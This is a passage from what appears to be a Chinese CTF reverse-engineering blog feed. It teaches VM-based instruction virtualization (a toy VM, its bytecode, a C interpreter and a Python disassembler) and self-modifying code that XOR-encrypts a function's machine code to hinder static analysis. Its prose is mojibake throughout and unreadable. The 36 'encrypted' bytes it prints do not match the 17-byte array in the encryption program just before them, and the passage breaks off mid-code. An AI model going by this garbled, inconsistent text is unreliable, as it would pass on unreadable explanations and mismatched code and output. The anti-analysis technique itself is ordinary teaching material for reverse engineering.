title="æ­£å‘å®ç°"></a><strong>æ­£å‘å®ç°</strong></h2><p>æƒ³è¦å¯¹æŠ—è™šæ‹ŸåŒ–ï¼Œé¦–å…ˆè¦ææ¸…æ¥šç”¨äºä¿æŠ¤çš„è™šæ‹Ÿæœºæ˜¯å¦‚ä½•å®ç°çš„è¦æƒ³å®ç°è™šæ‹Ÿæœºï¼Œéœ€è¦å®Œæˆä¸¤ä¸ªç›®æ ‡ï¼š</p><ol><li><p>å®šä¹‰ä¸€å¥—æŒ‡ä»¤é›†</p></li><li><p>å®ç°å¯¹åº”çš„è§£é‡Šå™¨</p></li></ol><h3 id="ç»“æ„ä½“å®šä¹‰"><a href="#ç»“æ„ä½“å®šä¹‰" class="headerlink" title="ç»“æ„ä½“å®šä¹‰"></a><strong>ç»“æ„ä½“å®šä¹‰</strong></h3><p>çœŸå®èµ›é¢˜ä¸­çš„ VM é€šå¸¸ä¼šå®ç°ä¸€ä¸ªç±»ä¼¼å¦‚ä¸‹çš„ç»“æ„ä½“ï¼Œç”¨äºä¿å­˜è™šæ‹ŸæœºçŠ¶æ€ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> r1; <span class="comment">// è™šæ‹Ÿå¯„å­˜å™¨ r1</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> r2; <span class="comment">// è™šæ‹Ÿå¯„å­˜å™¨ r2</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> eip; <span class="comment">// æŒ‡å‘æ­£åœ¨è§£é‡Šçš„ opcode åœ°å€</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> mem[<span class="number">256</span>]; <span class="comment">// è™šæ‹Ÿå†…å­˜</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> code[<span class="number">1024</span>]; <span class="comment">// å­˜æ”¾è‡ªå®šä¹‰æœºå™¨ç </span></span><br><span class="line">&#125; VM;</span><br></pre></td></tr></table></figure><h3 id="opcode-å®šä¹‰"><a href="#opcode-å®šä¹‰" class="headerlink" title="opcode å®šä¹‰"></a><strong>opcode</strong> <strong>å®šä¹‰</strong></h3><p>æ¥ç€è‡ªå®šä¹‰ä¸€äº›æŒ‡ä»¤ï¼Œéœ€è¦å†³å®šè¯¥æŒ‡ä»¤é›†æ˜¯<strong>å®šé•¿</strong>çš„è¿˜æ˜¯<strong>å˜é•¿</strong>çš„ã€‚</p><p>è¿™é‡Œä»¥å˜é•¿æŒ‡ä»¤é›†ä¸ºä¾‹ï¼Œå…ˆåˆ—å‡ºä¸€ä¸ªè¡¨æ¥ï¼š</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240123194824707.png" alt="image-20240123194824707"></p><h3 id="ä¹¦å†™æœºå™¨ç "><a href="#ä¹¦å†™æœºå™¨ç " class="headerlink" title="ä¹¦å†™æœºå™¨ç "></a><strong>ä¹¦å†™æœºå™¨ç </strong></h3><p>å‡å®šå¸Œæœ›å®ç°çš„è¯­ä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">char</span> input[<span class="number">6</span>];</span><br><span class="line"><span class="type">char</span> target[] = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%5s&quot;</span>, input);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">input[i] ^= <span class="number">0x21</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">memcmp</span>(input, target, <span class="number">5</span>))</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Yes\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;No\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¹æ®æˆ‘ä»¬å®šä¹‰çš„æŒ‡ä»¤å¯¹å…¶è¿›è¡Œæ‹†åˆ†å’Œé‡æ„ï¼Œå¯ä»¥å¾—åˆ°å¦‚ä¸‹æœºå™¨ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> code[] = &#123;</span><br><span class="line"><span class="number">0x20</span>, <span class="number">0x10</span>, <span class="number">0x48</span>, <span class="comment">// mem[0x10] = &#x27;H&#x27;</span></span><br><span class="line"><span class="number">0x20</span>, <span class="number">0x11</span>, <span class="number">0x65</span>, <span class="comment">// mem[0x11] = &#x27;e&#x27;</span></span><br><span class="line"><span class="number">0x20</span>, <span class="number">0x12</span>, <span class="number">0x6c</span>, <span class="comment">// mem[0x12] = &#x27;l&#x27;</span></span><br><span class="line"><span class="number">0x20</span>, <span class="number">0x13</span>, <span class="number">0x6c</span>, <span class="comment">// mem[0x13] = &#x27;l&#x27;</span></span><br><span class="line"><span class="number">0x20</span>, <span class="number">0x14</span>, <span class="number">0x6f</span>, <span class="comment">// mem[0x14] = &#x27;o&#x27;</span></span><br><span class="line"><span class="number">0x40</span>, <span class="comment">// scanf(&quot;%5s&quot;, &amp;mem[0]);</span></span><br><span class="line"><span class="number">0x11</span>, <span class="number">0x21</span>, <span class="comment">// r2 = 0x21</span></span><br><span class="line"><span class="number">0x10</span>, <span class="number">0x0</span>, <span class="comment">// r1 = 0</span></span><br><span class="line"><span class="number">0x30</span>, <span class="comment">// mem[r1] ^= r2</span></span><br><span class="line"><span class="number">0x10</span>, <span class="number">0x1</span>, <span class="comment">// r1 = 1</span></span><br><span class="line"><span class="number">0x30</span>,</span><br><span class="line"><span class="number">0x10</span>, <span class="number">0x2</span>, <span class="comment">// r1 = 2</span></span><br><span class="line"><span class="number">0x30</span>,</span><br><span class="line"><span class="number">0x10</span>, <span class="number">0x3</span>, <span class="comment">// r1 = 3</span></span><br><span class="line"><span class="number">0x30</span>,</span><br><span class="line"><span class="number">0x10</span>, <span class="number">0x4</span>, <span class="comment">// r1 = 4</span></span><br><span class="line"><span class="number">0x30</span>,</span><br><span class="line"><span class="number">0x50</span>, <span class="number">0x10</span>, <span class="number">0x5</span> <span class="comment">// return memcmp(&amp;mem[0], &amp;mem[0x10], 5);</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="åˆå§‹åŒ–è™šæ‹Ÿæœº"><a href="#åˆå§‹åŒ–è™šæ‹Ÿæœº" class="headerlink" title="åˆå§‹åŒ–è™šæ‹Ÿæœº"></a><strong>åˆå§‹åŒ–è™šæ‹Ÿæœº</strong></h3><p>åœ¨å®é™…è¿è¡Œè™šæ‹Ÿæœºä¹‹å‰ï¼Œéœ€è¦å…ˆå¯¹ VM ç»“æ„ä½“è¿›è¡Œåˆå§‹åŒ–ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">VM* <span class="title function_">vm_new</span><span class="params">()</span> &#123;</span><br><span class="line">VM* vm = (VM*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(VM)); <span class="comment">// ç”³è¯·å†…å­˜</span></span><br><span class="line"><span class="built_in">memset</span>(vm, <span class="number">0</span>, <span class="keyword">sizeof</span>(VM)); <span class="comment">// æ¸…ç©ºç»“æ„ä½“å­—æ®µ</span></span><br><span class="line"><span class="built_in">memcpy</span>(vm-&gt;code, code, <span class="keyword">sizeof</span>(code)); <span class="comment">// æ‹·è´æœºå™¨ç </span></span><br><span class="line"><span class="keyword">return</span> vm;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="è§£é‡Šå™¨ç¼–å†™"><a href="#è§£é‡Šå™¨ç¼–å†™" class="headerlink" title="è§£é‡Šå™¨ç¼–å†™"></a><strong>è§£é‡Šå™¨ç¼–å†™</strong></h3><p>ç°åœ¨å°±å¯ä»¥æ¥å®ç°æ¯æ¡æŒ‡ä»¤çš„ handle ä»¥åŠ dispatcher äº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vm_run</span><span class="params">(VM* vm)</span> &#123;</span><br><span class="line"><span class="type">char</span> opcode;</span><br><span class="line"><span class="type">char</span> operand_1, operand_2;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">opcode = vm-&gt;code[vm-&gt;eip];</span><br><span class="line"><span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x10</span>:</span><br><span class="line">operand_1 = vm-&gt;code[vm-&gt;eip + <span class="number">1</span>];</span><br><span class="line">vm-&gt;r1 = operand_1;</span><br><span class="line">vm-&gt;eip += <span class="number">2</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">operand_1 = vm-&gt;code[vm-&gt;eip + <span class="number">1</span>];</span><br><span class="line">vm-&gt;r2 = operand_1;</span><br><span class="line">vm-&gt;eip += <span class="number">2</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x20</span>:</span><br><span class="line">operand_1 = vm-&gt;code[vm-&gt;eip + <span class="number">1</span>];</span><br><span class="line">operand_2 = vm-&gt;code[vm-&gt;eip + <span class="number">2</span>];</span><br><span class="line">vm-&gt;mem[operand_1] = operand_2;</span><br><span class="line">vm-&gt;eip += <span class="number">3</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x30</span>:</span><br><span class="line">vm-&gt;mem[vm-&gt;r1] ^= vm-&gt;r2;</span><br><span class="line">vm-&gt;eip += <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x40</span>:</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%5s&quot;</span>, &amp;vm-&gt;mem[<span class="number">0</span>]);</span><br><span class="line">vm-&gt;eip += <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x50</span>:</span><br><span class="line">operand_1 = vm-&gt;code[vm-&gt;eip + <span class="number">1</span>];</span><br><span class="line">operand_2 = vm-&gt;code[vm-&gt;eip + <span class="number">2</span>];</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">memcmp</span>(&amp;vm-&gt;mem[<span class="number">0</span>], &amp;vm-&gt;mem[operand_1], operand_2);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å¯åŠ¨"><a href="#å¯åŠ¨" class="headerlink" title="å¯åŠ¨"></a><strong>å¯åŠ¨</strong></h3><p>äºæ˜¯ main å‡½æ•°å¯ä»¥è¿™æ ·å†™ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">VM* vm = vm_new();</span><br><span class="line"><span class="keyword">if</span> (!vm_run(vm))</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Yes\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;No\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a><strong>è§£é¢˜æ­¥éª¤</strong></h2><p>é‡åˆ° VM ç±»çš„èµ›é¢˜ï¼Œæˆ‘ä»¬ä¸€èˆ¬æŒ‰ç…§å¦‚ä¸‹çš„æ­¥éª¤æ¥è§£é¢˜ï¼š</p><ul><li><p>åˆ†æ VM ç»“æ„</p><ul><li>ç»“æ„ä½“å¤§å°</li><li>æœ‰å“ªäº›å­—æ®µï¼ˆå†…å­˜ã€å¯„å­˜å™¨ï¼‰</li></ul></li><li><p>åˆ†ææŒ‡ä»¤é›†</p><ul><li>æŒ‡ä»¤é•¿åº¦æ˜¯å¦å¯å˜</li><li>æ¯ç§æŒ‡ä»¤çš„æ„æˆ</li><li>æ¯ç§æŒ‡ä»¤çš„å«ä¹‰ï¼ˆä¼ªæ±‡ç¼–ï¼‰</li><li>VM çš„é€€å‡ºæ¡ä»¶</li></ul></li><li><p>ç¼–å†™ Python ç‰ˆè§£é‡Šå™¨ï¼Œè¾“å‡ºä¼ªæ±‡ç¼–ä»£ç </p></li><li><p>é˜…è¯»ä¼ªä»£ç ï¼Œåˆ†æç¨‹åºæµç¨‹ï¼Œå†™å‡ºå»è™šæ‹ŸåŒ–çš„åŸå§‹ä»£ç </p></li><li><p>ä¹¦å†™è§£é¢˜è„šæœ¬</p></li></ul><p>æœ¬ä¾‹ä¸­çš„ Python ç‰ˆè§£é‡Šå™¨å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">code = [<span class="number">0x20</span>, <span class="number">0x10</span>, <span class="number">0x48</span>, <span class="number">0x20</span>, <span class="number">0x11</span>, <span class="number">0x65</span>, <span class="number">0x20</span>, <span class="number">0x12</span>, <span class="number">0x6c</span>, <span class="number">0x20</span>, <span class="number">0x13</span>, <span class="number">0x6c</span>,</span><br><span class="line"><span class="number">0x20</span>, <span class="number">0x14</span>, <span class="number">0x6f</span>, <span class="number">0x40</span>, <span class="number">0x11</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0x0</span>, <span class="number">0x30</span>, <span class="number">0x10</span>, <span class="number">0x1</span>, <span class="number">0x30</span>, <span class="number">0x10</span>, <span class="number">0x2</span>,</span><br><span class="line"><span class="number">0x30</span>, <span class="number">0x10</span>, <span class="number">0x3</span>, <span class="number">0x30</span>, <span class="number">0x10</span>, <span class="number">0x4</span>, <span class="number">0x30</span>, <span class="number">0x50</span>, <span class="number">0x10</span>, <span class="number">0x5</span>]</span><br><span class="line">ip = <span class="number">0</span></span><br><span class="line">r1 = r2 = <span class="number">0</span></span><br><span class="line">mem = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">opcode = code[ip]</span><br><span class="line"><span class="keyword">if</span> opcode == <span class="number">0x10</span> :</span><br><span class="line">r1 = code[ip + <span class="number">1</span>]</span><br><span class="line">print(f<span class="string">&quot;mov r1, &#123;hex(code[ip + 1])&#125;&quot;</span>)</span><br><span class="line">ip += <span class="number">2</span></span><br><span class="line">elif opcode == <span class="number">0x11</span> :</span><br><span class="line">r2 = code[ip + <span class="number">1</span>]</span><br><span class="line">print(f<span class="string">&quot;mov r2, &#123;hex(code[ip + 1])&#125;&quot;</span>)</span><br><span class="line">ip += <span class="number">2</span></span><br><span class="line">elif opcode == <span class="number">0x20</span> :</span><br><span class="line">op1, op2 = code[ip + <span class="number">1</span>], code[ip + <span class="number">2</span>]</span><br><span class="line">mem[op1] = op2</span><br><span class="line">print(f<span class="string">&quot;mov [&#123;hex(op1)&#125;], &#123;hex(op2)&#125;&quot;</span>)</span><br><span class="line">ip += <span class="number">3</span></span><br><span class="line">elif opcode == <span class="number">0x30</span> :</span><br><span class="line">mem[r1] ^= r2</span><br><span class="line">print(f<span class="string">&quot;xor [&#123;hex(r1)&#125;], &#123;hex(r2)&#125;&quot;</span>)</span><br><span class="line">ip += <span class="number">1</span></span><br><span class="line">elif opcode == <span class="number">0x40</span> :</span><br><span class="line"><span class="meta"># flag = input().encode()</span></span><br><span class="line">flag = b<span class="string">&quot;iDMMN&quot;</span></span><br><span class="line"><span class="keyword">for</span> i in range(len(flag)) :</span><br><span class="line">mem[i] = flag[i]</span><br><span class="line">ip += <span class="number">1</span></span><br><span class="line">elif opcode == <span class="number">0x50</span> :</span><br><span class="line">op1, op2 = code[ip + <span class="number">1</span>], code[ip + <span class="number">2</span>]</span><br><span class="line">print(mem[<span class="number">0</span>:op2] == mem[op1:op1 + op2])</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">raise ValueError(<span class="string">&quot;unknown opcode&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;æŒ‡ä»¤è™šæ‹ŸåŒ–&quot;&gt;&lt;a href=&quot;#æŒ‡ä»¤è™šæ‹ŸåŒ–&quot; class=&quot;headerlink&quot; title=&quot;æŒ‡ä»¤è™šæ‹ŸåŒ–&quot;&gt;&lt;/a&gt;æŒ‡ä»¤è™šæ‹ŸåŒ–&lt;/h1&gt;&lt;p&gt;è™šæ‹Ÿæœºï¼ˆVMï¼‰å…¶å®å°±æ˜¯ç”¨è½¯ä»¶æ¥æ¨¡æ‹Ÿç¡¬ä»¶ã€‚æˆ‘ä»¬å¯ä»¥ä»¿ç…§ x86 æŒ‡ä»¤é›†ï¼Œè‡ªå·±å®šä¹‰ä¸€å¥—æŒ‡ä»¤ï¼Œåœ¨ç¨‹åºï¼ˆè§£é‡Šå™¨ï¼‰ä¸­æœ‰ä¸€å¥—å‡½æ•°</summary>
      
    
    
    
    
    <category term="æŒ‡ä»¤è™šæ‹ŸåŒ– VM" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/%E6%8C%87%E4%BB%A4%E8%99%9A%E6%8B%9F%E5%8C%96-VM/"/>
    
  </entry>
  
  <entry>
    <title>è‡ªä¿®æ”¹ä»£ç </title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/01/22/20240122_%E8%87%AA%E4%BF%AE%E6%94%B9%E4%BB%A3%E7%A0%81/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/01/22/20240122_%E8%87%AA%E4%BF%AE%E6%94%B9%E4%BB%A3%E7%A0%81/</id>
    <published>2024-01-21T16:00:00.000Z</published>
    <updated>2024-01-22T16:06:59.822Z</updated>
    
    <content type="html"><![CDATA[<p>PEæ–‡ä»¶ç»“æ„&#x2F;&#x2F;</p><h1 id="è‡ªä¿®æ”¹ä»£ç "><a href="#è‡ªä¿®æ”¹ä»£ç " class="headerlink" title="è‡ªä¿®æ”¹ä»£ç "></a>è‡ªä¿®æ”¹ä»£ç </h1><p>Self-Modifying Code</p><p>è‡ªä¿®æ”¹ä»£ç ï¼ˆSelf-Modifying Codeï¼‰ï¼ŒæŒ‡åœ¨ä¸€æ®µä»£ç æ‰§è¡Œå‰å¯¹å®ƒè¿›è¡Œä¿®æ”¹ã€‚æŠŠä»£ç ä»¥åŠ å¯†çš„å½¢å¼ä¿å­˜åœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼ˆæˆ–é™æ€èµ„æºä¸­ï¼‰ï¼Œç„¶ååœ¨ç¨‹åºæ‰§è¡Œçš„æ—¶å€™è¿›è¡ŒåŠ¨æ€è§£å¯†ã€‚è¿™æ ·æˆ‘ä»¬åœ¨é‡‡ç”¨é™æ€åˆ†ææ—¶ï¼Œçœ‹åˆ°çš„éƒ½æ˜¯åŠ å¯†çš„å†…å®¹ï¼Œä»è€Œå‡ç¼“ç”šè‡³é˜»æ­¢é™æ€åˆ†æã€‚</p><h2 id="åŸç†ä¸ç¤ºä¾‹"><a href="#åŸç†ä¸ç¤ºä¾‹" class="headerlink" title="åŸç†ä¸ç¤ºä¾‹"></a>åŸç†ä¸ç¤ºä¾‹</h2><p>SMCæ€è·¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (è¿è¡Œæ¡ä»¶æ»¡è¶³) &#123;</span><br><span class="line">DecryptProc(Address of Check) <span class="comment">// å¯¹ Check ä»£ç è§£å¯†</span></span><br><span class="line"><span class="comment">// ........</span></span><br><span class="line">Check(); <span class="comment">// è°ƒç”¨ Check</span></span><br><span class="line"><span class="comment">// ........</span></span><br><span class="line">EncryptProc(Address of Check) <span class="comment">// å†å¯¹ä»£ç è¿›è¡ŒåŠ å¯†ï¼Œé˜²æ­¢ç¨‹åºè¢« dump</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SMCé™æ€åˆ†æå¯¹æŠ—ç¤ºä¾‹ï¼š</p><p>æ­£å¸¸ç¨‹åºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">check</span><span class="params">(<span class="type">int</span> in)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> in == <span class="number">12345</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> input;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line"><span class="keyword">if</span> (check(input))</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;good!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ VS ä¸­ Release 32 ä½ä¸‹ç¼–è¯‘ï¼ˆå…³é—­éšæœºåŸºå€ï¼‰ï¼Œæ”¾å…¥ IDA ä¸­æŸ¥çœ‹ï¼š</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240122225317272.png" alt="image-20240122225317272"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> _check__YAHH_Z[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x55</span>, <span class="number">0x8B</span>, <span class="number">0xEC</span>, <span class="number">0x51</span>, <span class="number">0x81</span>, <span class="number">0x7D</span>, <span class="number">0x08</span>, <span class="number">0x39</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x75</span>, <span class="number">0x09</span>, <span class="number">0xC7</span>, <span class="number">0x45</span>, <span class="number">0xFC</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xEB</span>, <span class="number">0x07</span>, <span class="number">0xC7</span>, <span class="number">0x45</span>, <span class="number">0xFC</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x8B</span>, </span><br><span class="line">  <span class="number">0x45</span>, <span class="number">0xFC</span>, <span class="number">0x8B</span>, <span class="number">0xE5</span>, <span class="number">0x5D</span>, <span class="number">0xC3</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ç°åœ¨æˆ‘ä»¬æƒ³æŠŠ check å‡½æ•°ä¿æŠ¤èµ·æ¥ï¼Œå…ˆæŠŠå…¶æœºå™¨ç æ‘˜å‡ºæ¥è¿›è¡ŒåŠ å¯†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> check[] =</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">0x55</span>, <span class="number">0x8B</span>, <span class="number">0xEC</span>, <span class="number">0x33</span>, <span class="number">0xC0</span>, <span class="number">0x81</span>, <span class="number">0x7D</span>, <span class="number">0x08</span>, <span class="number">0x39</span>, <span class="number">0x30</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0F</span>, <span class="number">0x94</span>, <span class="number">0xC0</span>, <span class="number">0x5D</span>, <span class="number">0xC3</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(check); i++)</span><br><span class="line">&#123;</span><br><span class="line">check[i] ^= <span class="number">0x90</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, check[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŠ å¯†åï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c5 1b 7c c1 11 ed 98 a9 a0 90 90 e5 99 57 d5 6c 91 90 90 90 7b 97 57 d5 6c 90 90 90 90 1b d5 6c 1b 75 cd 53</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹åˆå§‹ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 